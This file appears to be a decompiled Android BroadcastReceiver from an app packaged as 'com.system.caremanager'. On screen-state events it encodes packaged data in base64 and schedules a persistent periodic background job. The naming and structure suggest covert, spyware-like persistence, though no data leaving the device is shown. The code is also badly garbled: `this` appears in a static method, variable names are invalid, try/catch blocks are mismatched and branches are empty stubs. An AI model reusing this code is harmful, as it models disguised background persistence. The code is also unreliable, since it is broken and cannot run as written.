package com.system.caremanager;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class ScreenStateReceiver extends BroadcastReceiver {

    public ScreenStateReceiver() {
        return;
    }

    public static void scheduleJob(Context param1) {
        try {
            String str = "jobscheduler";
            Object result = this.getSystemService(str);
            result = (JobScheduler) result;
            ComponentName componentName = new ComponentName();
            Class cls = PersistentJobService.class;
            int SDK_INT = Build$VERSION.SDK_INT;
            int val = 24;
            int val2 = 100;
            if (SDK_INT < val) {
                // branch: cond_0
            }
            JobInfo.Builder jobInfo.Builder = new JobInfo.Builder();
            JobInfo.Builder result2 = this.setPeriodic(componentName, val);
            JobInfo result3 = this.build();
            // continue loop -> :goto_0
            JobInfo.Builder jobInfo.Builder2 = new JobInfo.Builder();
            JobInfo.Builder result4 = this.setPeriodic(componentName, val);
            JobInfo result5 = this.build();
            int result6 = result.schedule(result);
            } catch (Exception e) {
                e.printStackTrace();
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void onReceive(Context param1, Intent param2) {
        try {
            Context appContext = MainBackgroundService.appContext;
            if (appContext != null) {
                // branch: cond_0
            }
            MainBackgroundService.appContext = param1;
            boolean echo = DataEncryptionEngine.echo;
            if (echo == null) {
                // branch: cond_1
            }
            String result = DataPackagingEngine.removeString(str, str2);
            int FivePlusFive = DataPackagingEngine.FivePlusFive;
            String result2 = String.valueOf(FivePlusFive);
            byte[] result3 = result.getBytes();
            DataEncryptionEngine.encodeBase64(result, result);
            ScreenStateReceiver.scheduleJob(param1);
            // continue loop -> :goto_4
            } catch (Exception e) {
                e.printStackTrace();
            Boolean result4 = Boolean.valueOf(1);
            boolean result5 = result.booleanValue();
            if (result == null) {
                // branch: cond_2
            }
            Boolean result6 = Boolean.valueOf(null);
            // continue loop -> :goto_0
            boolean result7 = result.booleanValue();
            if (result == null) {
                // branch: cond_3
            }
            Boolean result8 = Boolean.valueOf(null);
            // continue loop -> :goto_1
            boolean result9 = result.booleanValue();
            if (result == null) {
                // branch: cond_4
            }
            Boolean result10 = Boolean.valueOf(null);
            // continue loop -> :goto_2
            boolean result11 = result.booleanValue();
            if (result == null) {
                // branch: cond_5
            }
            Boolean result12 = Boolean.valueOf(null);
            // continue loop -> :goto_3
            return;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}